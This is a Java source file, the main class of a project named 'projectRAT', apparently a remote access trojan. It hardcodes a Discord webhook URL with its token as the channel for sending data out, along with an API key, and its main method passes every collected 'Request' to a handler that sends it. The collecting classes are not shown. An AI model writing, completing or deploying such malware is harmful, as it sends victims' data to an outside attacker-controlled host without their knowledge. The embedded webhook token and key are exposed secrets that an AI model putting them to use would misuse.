package in.momin5.projectRAT;

import in.momin5.projectRAT.request.Request;
import in.momin5.projectRAT.request.RequestManager;

import java.util.Arrays;
import java.util.List;

public class ProjectRAT {

    public static String webhook = "https://discord.com/api/webhooks/880506474328129566/n0VkT2jMsc8E1ZtMVM4pAUhfPOhB1xXt1W7_tCK4vWOFos7G5gERFeJixGmxdNbBKBlB";
    public static String apiKey = "b4ee6a619f9b4212a33f8881459d2cb7";
    public static List<String> jarNames = Arrays.asList(
            "main",
            "cool"
    );

    public static void main(String[] args) {
        try {
            RequestManager manager = new RequestManager();
            for (Request request : manager.getRequests()){
                request.init();
                new RequestHandler().sendRequest(request);
            }
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
